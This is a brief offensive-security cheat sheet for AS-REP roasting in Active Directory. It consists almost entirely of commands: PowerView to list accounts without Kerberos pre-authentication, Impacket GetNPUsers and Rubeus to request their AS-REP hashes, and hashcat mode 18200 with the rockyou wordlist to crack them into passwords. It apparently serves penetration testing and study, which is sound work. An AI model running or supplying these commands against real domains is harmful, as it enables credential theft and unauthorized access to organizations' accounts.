# Identify vulnerable users
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

-----------------------

# Impacket
```bash
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/dave:password
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

-----------------------

# Rubeus
```bash
.\Rubeus.exe asreproast /nowrap [/user:username]
```

-----------------------

# Cracking asreroast hashes
```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
